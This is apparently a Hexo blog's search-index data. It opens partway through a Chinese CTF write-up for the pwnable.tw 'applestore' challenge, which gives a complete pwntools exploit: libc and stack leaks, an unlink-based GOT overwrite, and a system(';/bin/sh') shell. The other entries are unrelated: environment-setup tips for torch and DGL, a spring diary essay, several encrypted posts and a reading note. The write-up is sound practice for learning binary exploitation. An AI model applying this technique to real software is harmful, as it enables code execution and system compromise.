src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-07%20%E4%B8%8B%E5%8D%882.02.55.png\" alt=\"截屏2022-05-07 下午2.02.55\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;yy&#x27;</span> + p32(environ_addr)  +  p32(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">cart(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;27: &quot;</span>)</span><br><span class=\"line\">stack_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(stack_addr)))</span><br></pre></td></tr></table></figure>\n<p>​                </p>\n<p>​            这里的栈地址是<code>0xffffdec0</code>，而我们想到覆盖的是delete函数的ebp，也就是<code>0xffffddb8</code></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-07%20%E4%B8%8B%E5%8D%882.17.53.png\" alt=\"截屏2022-05-07 下午2.17.53\"></p>\n<p>​        偏移是0x108。所以我们想要覆盖的地址就是<code>stack_addr + 0x108</code>,所以这里利用delete的unlink操作将它覆盖为atoi_got + 0x22。</p>\n<p>​        unlink具体的计算其实可以套公式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">ebp_addr = stack_addr - <span class=\"number\">0x108</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;27&#x27;</span> + p32(stack_addr) + p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(read_got_addr + <span class=\"number\">0x22</span>) + p32(stack_addr  - <span class=\"number\">0xc</span>)<span class=\"comment\"># *( fd - 0xc ) = got - 0x22</span></span><br><span class=\"line\">delete(payload)</span><br></pre></td></tr></table></figure>\n<p>​    这样ebp就会被修改为got + 0x22，返回后即可以修改got为system。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./applestore&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;./libc_32.so.6&quot;</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;chall.pwnable.tw&quot;,10105)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./applestore&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\">read_got_addr = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">atoi_got_addr = elf.got[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Device Number&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(idx)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil((<span class=\"string\">&quot;Item Number&gt; &quot;</span>))</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cart</span>(<span class=\"params\">data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(data)</span><br><span class=\"line\">\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkout</span>():</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Let me check your cart. ok? (y/n) &gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;y&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">\tadd(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">\tadd(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">checkout()</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;yy&#x27;</span> + p32(read_got_addr)  +  p32(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">cart(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;27: &quot;</span>)</span><br><span class=\"line\">libc_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = libc_addr - libc.symbols[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">environ_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;environ&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;yy&#x27;</span> + p32(environ_addr)  +  p32(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">cart(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;27: &quot;</span>)</span><br><span class=\"line\">stack_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(stack_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">ebp_addr = stack_addr - <span class=\"number\">0x108</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;27&#x27;</span> + p32(stack_addr) + p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(atoi_got_addr + <span class=\"number\">0x22</span>) + p32(stack_addr  - <span class=\"number\">0xc</span>)<span class=\"comment\"># *( fd - 0xc ) = got - 0x22 </span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(payload)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, p32(system_addr) + <span class=\"string\">b&quot;;/bin/sh&quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - Other"]},{"title":"云GPU+论文复现 环境搭建tips","url":"/2023/09/05/%E4%BA%91GPU+%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAtips/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-pkUWYVzU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"conda\">conda</span></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">conda create -n xx python=xx</span><br><span class=\"line\">conda init bash</span><br><span class=\"line\"></span><br><span class=\"line\">restart bash</span><br><span class=\"line\"></span><br><span class=\"line\">conda activate xx</span><br><span class=\"line\">conda deactivate xx</span><br></pre></td></tr></table></figure>\n<p>此后所有 conda install或者pip install 都会被配置在这个相对隔离的环境中</p>\n<h2><span id=\"torch版本\">torch版本</span></h2><h3><span id=\"torch\">torch</span></h3><p>torch最好不要无脑pip安装，因为通常它只会安装最新版，而不是适合你的环境的版本。<br>所以稳妥的做法是看复现环境的依赖，或者去根据你的配置去<a href=\"https://pytorch.org/get-started/locally/\">官网</a>找合适的版本。</p>\n<p>但是我的经验是，对于autodl这样存在预装环境的平台，预装的torch版本最好小于等于依赖要求的版本，不然可能真的会存在硬件或者gpu版本不匹配的问题。</p>\n<p>以下是一些常见的安装指令<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># CUDA 11.3</span><br><span class=\"line\">pip install torch==1.12.1+cu113 torchvision==0.13.1+cu113 torchaudio==0.12.1 --extra-index-url https://download.pytorch.org/whl/cu113</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"pyg\">pyg</span></h3><p>torch-sparse，torch-scatter，torch-cluster，torch-spline-conv，torch-geometric<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install pyg-lib torch-scatter torch-sparse torch-cluster torch-spline-conv torch-geometric -f https://data.pyg.org/whl/torch-1.12.0+cu113.html</span><br></pre></td></tr></table></figure></p>\n<p>如果安装时卡住了，例如一直停留在<code>setup.py</code>，那么可能是网络问题导致whl包没有下载成功，而不是它安装真的要那么久。<br>解决办法是手动点进网页下载，然后直接<code>pip install xxx.whl</code>，基本都是秒安装。</p>\n<h2><span id=\"dgl\">DGL</span></h2><p>如果是在gpu上跑，需要同时装统一版本的dgl-cu和dgl。亲测少装一个都没用。<br>比如依赖指定的版本是<code>0.5.0</code><br>那么可以先</p>\n<p><code>pip install dgl==0.5.0</code><br>安装以后再进网站找需要安装的dgl-cu版本<br><a href=\"https://conda.anaconda.org/dglteam/linux-64\">https://conda.anaconda.org/dglteam/linux-64</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-05%20at%2011.37.04%20AM.png\" alt=\"Screen Shot 2023-09-05 at 11.37.04 AM\"><br>例如说我想安装这一条，就直接<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install dgl-cuda10.2==0.5.0</span><br></pre></td></tr></table></figure></p>\n<p>当<code>pip list | grep dgl</code>出现dgl和dgl-cuda10.2，大概就没啥问题了。</p>\n","categories":["ML"],"tags":["mess"]},{"title":"春日和","url":"/2022/04/03/%E5%B9%BB%E6%83%B3%E6%9B%B2-01-%E6%98%A5%E5%A4%A9/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-kkAmrXhc\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        一系列的事情最终使我感觉，春天确实已经到了。</p>\n<p>​        首先是刷牙时无意发现的丢在洗衣机旁阴暗角落的，去年秋天栽下去的铃兰花长出的鲜嫩的叶片。那时候和小戴怀着赌一把的心理，一起将一些看起来黄不拉几的铃兰根系一颗一颗地埋在土里，还非常认真地每隔几天就浇水，但是泛着土色的幼芽接连几个月都毫无起色，有时候甚至看起来像发霉了一般，于是后几个月我和小戴谁也没有管它——我们俩一致认为它已经死了。 </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_2307.jpg\" alt=\"IMG_2307\"></p>\n<p>​        但是似乎，它真的在一夜之间，从一位濒死的垂鬓长成了生机勃勃的少年人。叶片是充满生命活力的鲜绿色，又或者说是我最近很喜欢穿的荧光绿衣服的颜色，叶片笔直而坚挺，倒像是一颗年轻的大葱，希望它也能像大葱那样好养活吧。</p>\n<p>​        我被这样突如其来的惊喜给感动了，于是逐渐开始回忆，春天到来时，我身边美好生命的点点滴滴。最显而易见的美，一定是上周开满学校的樱花树。</p>\n<p>​        学校种的是中国樱花，花开起来大约有三分之二个小姑娘的手那么大，花瓣重重叠叠，粉粉嫩嫩的，单看还是娇艳欲滴，让人心生向往的，但是远看整片樱花树林，我倒觉得没有日本种的樱花看起来那么盛大了，学校种这些樱花的思路，大概和日本街头的完全不一样吧。学校里的樱花，相比树木，倒更起了“灌木”的作用，树枝纤弱着，似乎更加易于运输和移栽，时间成本也会更低。有机会可以去武大看看，那边的樱花似乎是日本樱花，应该会很好看。</p>\n<p>​        这一周接连下了五六天的雨，到今天早上看的时候，寝室楼下的樱花树已经完全没有了盛开过的痕迹，那些粉色的落花被雨水完全清扫干净了，取而代之的，是春夏天交接的清冽气息。借用之前在网上看到的话，讲的大概是“用‘春天结束了’来代指夏天的到来，本身就很浪漫”，不过这里春天才刚刚开始，笑。</p>\n<p>​        雨水也是春日美好的主角之一。我喜欢看树色被雨水冲洗过后闪闪发光的新绿，饱和度极高的鲜艳色彩与大理石地面上的积雨融在一起，颇有“水树一色”的意味，这时候通常又是在早八的稍后一些，路上没有什么人，耳朵里只有雨水滴答在胶皮伞面上清晰而响声，这是怎样先进音响效果也无法比拟的。虽然下雨会湿鞋，这点有些令人恼火。</p>\n<p>​        雨停的时候，鸟鸣代替了雨声，稀疏而悦耳的鸟鸣，混杂着树林制造的自然背景音，又是一种奇妙的体验。如果平时走在路上感受不到，不妨用手机记录下来，在安静的地方听一听，确实有奇效。（杜比全景音真的很强）</p>\n<p>​        但是春天真的很短，似乎下周开始就要进入夏天了，不过话说回来，夏天我也是很喜欢的。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"春夜","url":"/2022/04/08/%E5%B9%BB%E6%83%B3%E6%9B%B2-02-%E6%98%A5%E5%A4%9C/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"4777bbcce3a5969c125d305c271eb808c8be65caefee1f7a824e135d09e53bf7\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c86347c2ef84ae214252a4dd3e3fc5dfedb31c575c116c18ea85f33cc69cdbd736d3de7d122babbb083c168403864f644853d9154e92cecf2903f9dbc74ac589a9444caf8b00bf91cbb6c178296e706f5b688d6f84e5ae4c811fd88a8a4229030cd36345da1e3b92865a001bf6037d1cd4474c4f973aa5138790de1e67ccfc3d8740580969e14fb0e07ea77269636e7138244fa1b115b4efb93485f53ea535e108f2ff6cbbd5eb378f117e8ebf49cc9cff16f18878f739552570bacac38f1f7b379a06be16457888d409554d6bbb7e72b269c7363ba50751002f713464a93ac9615370b5205b3fc07a688d16d864d0313f80cd91a469970a44a5d721b7ce274bbc53307dbf16fe1a03d788551a0dd0d498ceedced7c71c88522d107bc8644e2c42af4cfe6db1b21a9c34e2310daa7fbccbc3a1bee83f14ac87f46f0d06c89ac86d3ef9f07ea1d525f91221e8e079adc96e463fe9f2a002eaabaabf76ac6d6fc2d2f34e30da57b0c1e56a243daa7ee31e3f34f5788a654ce719099db7c1970e82528bb730a77953a9550da749ded838c015acd71f17aed1ca7e127e896c899f7ad9c6675d6adc19fcd649e1f1556a98ac1b8ae56ae8e11b0d5e6370da86f605667754a12ac033227561e928514c382358778bcfe7a27811df5e9191ce231ae8dce8e09cf9ddb6be1dde61529b2e6f50ae48dc696c99c4eb0a5babf58d26b4773abafc7f3058a161f0c8dddb52051e2e17ab4019cbc4d91722e718df85f4f339728b2bad0e1e6f2ce5b8bb5605ef4c14fbb2b55dd28478b7a3c8e18cb5029780712d910e1108b58e39340eece76feab4a7658ac773db21435d3fba2937e56c7c23f80775364aee1d336e947597089d37612ff46034a210e4f32625bf100b117ec2641b0f335946c79b814dff4f060c49dfa948306b6a5d181c9048ab3ea1434b7d03aab62e98da73e0dd2966d40ffdd40334d96c8453bdb8143e77a74a68abacc6e3b1324319c35dc2bc5677d9a0546b1e73a731b36343d27cc59ea77feeb631c3018d765ecf6946840e296129d60cfab7452ca30ab869ce04b3c2ccec908f4c388265eb17decb0d888011f81fa9834febe95e44cb87b6219fe0342443ebea0ba6d85b0c7a10f4523b66cd80fbbe4a125a0d00095541244f0a7d41ec7ac0e02bcb7d5bf2f9a40b54fbe9faafb773bb2641a12aa359074fe5caf12e0c933ba3159f2f1efe5a8406b221f01d4a144ab770c0bf2305de9a2ae9dd4daf2467261a1f0581c1882d3ebc44bfd1b29ee05ed4d59a9da4f7eb04f2e0507ed78b81bb84ff2536193c56009860400fe9c543216e2ef7595da6090cbcc58ce92879f497a050316d49fc5c31fe752d92d22481de7e24e5e28ca55f153500857744601a31a639d8a3f539c1eaf054d168be29290913350a07f0a29eaa236d5f70c7e5860844b87001542f766b9d022f6748a84de205f55748a3628bfdbd5f846c8162e2742bdf2fcf81a23a0d8867c36a4b815aff99c6a0d6e33e21ad6293fedcff0e97f1187d5b5203ad5a35ef007f2dcb2e337017e7d13aa1faeaaa7039fb827daf88105ec644d0ade0e05fea30a4bb9c37e452a6f7db7bec7a395ab937b50387145236259cd49f06b24b2a107954a18c278c3df65f30781519f67b946ad407a7e86ff8da742c067991de63c85d25b21b1672066578add7deb6a6e68c1fcf92e81ea1432d5e037647ff5cddbbf2cf219de35b69d9a0101490bf44dda9f3ee2a9224bd043c0cc462b86ba5bf89b2e8e396d44d17c90489ffc39c16523392f71e0b881ff7e4dcbdfd7eb1fee5ea12f06a6ca5d7badd111dd926bfa43fbf9bd600b5f1aab74976445369d4b1834ac6760a24567741902caeb901371632c001e52aff0dab8cbc666d222a835f65fae702f49cdc33af639896379ba3fc8780ad730da176e50794394fa8cfddb1137a752f696acf1c2050e6f3426cbf04eb31891e6d189fc108e3bc2b413f0d032ec787e8f22eca88d7944282efb72947b412262e926217fe87a60ee007f9b67ac5a282d5536a88e1be41330e3fd5d275ba85a73e33a5014147b1e03ad64bfabb427060f780587e3a85430a25f0bde359bf04492fe9f59ba1bb4b2faac8e84fb62343cfd52a7bc1e6a2d9f38b478fc8e6f4d53aad57f5ee0700ca52b737d1206ae85d519a0c6f619848921689f723d9c3ef1d1e89582bc713dc6949a5cc14f28d5d26f1ea00e81737f3a7b2eca00eebb420ebdf90a8949f7de9aa39ad07ee90e4ec4b49099d3b8778187cd9e413b4d6312cba921c23beef3321658d687c1bf698fb3d64a0ef57fea8e283287fbf937213433152377066f397eec7db88e685e5aa5b5c33d072cd898b20ac4562a43f125148a7912bf9e1b51ba0eea79991c930ae82a3dd9628c05b59f5cae42dd4c70e6ea5db5bb75f374df2ee4ea24c4f77edecfa48380d5e754fac9e4196c31d638c83f93a026f836f617cd16874faed6003910ce99f0ec0a5d75ac0cd168cbb48e14e101647993d17db8945f50ab055cabd01a3e5cf3f5845caad7deefa0111c1109d6a15be19f0ca19c5e15f795ec09e0e9a986b151ce2cd84ace693be9faf70786d9d1c38282e57975c14d18ec44b4ed713878e85d485130026fe0a99250896c899aff4bd80a98dc6df13c1cb8d5fc4516c3a6e3d351bdae302431ce0066029d7b25680d810dbebe027bbcded2aa4e997df2cd3b57369270450c732e991926225ca8578262da46f85f251158f70b37a7874da5b7303433c36e8200f1c485590f4caafd8bf4ae83be39fbcc369eec6e3a8ea5e53a1434c991c9086c9b5fa3c3722d42977db651fc937cba305f147ee8b24b07af9011e7fff1a3f6f0065823b8891c2ae44612a501a4166406734d9db6786819c8341b6b41a734512c873fb262552a971a8770abf4d81ed69624653ef62ee632a0405f53e63981c9b4ec7c7b7dd6a688dc5eb9df2b3d3fcf4a3a059c3bef0c5d364fcd915be96184ad38011ed4cbbd94cf444ea432e4357087b0f8e9d84d50a351c11c55769411749f51e8841b2f3a45a423c07016abb4f09601b0217735523076fc9b88fdeb0efd694596f9f5d26d9554f330e1291766dd5378eb8ed907d63e06314693a8bcf7cfff64ec7671d54b57a2e56b7413e160c02e9205fc57356bfe3c4f967aae153db97ee4abde640eb3941925de77d6639c3ffa8eede9319b7ba70a3b612e3ea9f9869b7e969e4d77c8c1b7d8d4697c2add9d1a0992231e3fed8d6492641edadaaa44d307f93ea151ff94933bf401c4ed444c977ccd8b5d23b0e6df6b0b251ecbd538e28a20907237dd6ff07ee1f1b96805468e5c86d794c35e02fa3140e348cd20f9c1ad438e8a54fabdbcf1d6f85b0a0aac69bef94f6b7e1a61f662ef77b1724b2297d287af0e9cf7cb0f15dcb78a4652e70baaf5d3dcb2d3ae86682331504d1b104afeb7a4ea1ec0d6d20c3a61d554a113acdf57e6a99d08f229c079e6565cca157e2d2fa742f5594850c9f12aad1c3a5d0072618badd9ec890d8b2a4e4cb5002304dab2df2872652d09f0a55d8bba82b28c7ed6bb8906c93d4a2627e818616d46b4c4876e351bc20ff0661fe1c4d8afca325ca07a259ffd7d6c3f9fea4a9519cb401ce07d066fa3e5d67592f8ce734888169511bfd3f0f7ba57295a62777e5fc15c45edd6d1cda8f59009f43cacd7908aac3ed24f6e628c7c2cadf6dcc5e130096ebac59a6949a6846c71acb321103f1910add3cafbc871d9c30a904610212e67aa9a3e93dbf6bd0bd88e66a9a4c807c233eea9f9fb010b785155b46ed78c8171159ed2d9999d0d9cf22a889157329bba5d8fb1e7f523a64cb9a69445c9aaba12605c4ac76a6354a6b0db12501a63a62b055ec790f299ecb1a7d2ceb9ea85fba6376b54c60917d90405cf7974924a05d288db63eb4901e83a9b26dc655c271f3441887586ea186417ce70816d5268ab594ef6c45fcecd426f6bc9d29f56831bfbf4b564dfb8aa170dd478a8f3f8866b23775b76fbb1fe01cd51dee84560030fd6a2f1e6c5f24acb6897164e3cf6b90d2a3a87d50fa728ddc6925a320f6e6bbffd8514e566e1f5285a172661486e723d66dce41ccc989417d01675623e3cd99b5a0774b3e7be712d673fd263dbddcf8c0d830324c5c8c2b9f0706e0dc22b679e8bc9e81675beef84ffa502e7c4b64db0764bdb9e0e2a9d626d7f33aa19bcff7a73be8c918ef4955c71f3948435c8810b01de831a2c8aecf33fa2885bc8278167432dde89b8b374ed2aa4de52b2293ddc23aefcc7db92e932bbcb5530bb6c9ce7c280deecf17933a8b469dda51f95d34b72ad6060852cbfd24eed6c26e744e2689434acadd87899810bf059eb15a73c299a1d6fac19c67ec030dc8697acda6b95bfe39910c6878df84c6821681114b38876a3882b61d49007baa6788656c9248354f050f7f3c64a6fe5fcd4d1492b05d72bec333ebcb25e00b93bfa244bb1bc8803b7e1f901d</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"夏","url":"/2022/05/13/%E5%B9%BB%E6%83%B3%E6%9B%B2-03-%E5%A4%8F/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"f5b66518f438a9f72fb610c8422b8b3ec1081c615a0daa23ee3bc96b5baaaed4\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"夏 其二","url":"/1919/08/10/%E5%B9%BB%E6%83%B3%E6%9B%B2-04-%E5%A4%8F%20%E5%85%B6%E4%BA%8C/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"5a28719c75e96284c64a2f6ed11dd2e9a1e517cb85e58891f171f016ff82d29c\"></script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"追忆似水年华","url":"/2022/10/13/%E5%B9%BB%E6%83%B3%E6%9B%B2-05-%E8%BF%BD%E5%BF%86%E4%BC%BC%E6%B0%B4%E5%B9%B4%E5%8D%8E/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-SnnWjHxT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        花了大半个月，我看了追忆似水年华第一部的四分之一，以睡前读十五分钟的形式。</p>\n<p>​        我完全不想写什么读后感之类的东西，因此如果可以，我希望模仿普鲁斯特的文笔去记录一些事。这就是我的全部感想。</p>\n<p>​        于是在我决定动笔的一瞬间，这件事就已经划上了句号。</p>\n<p>​        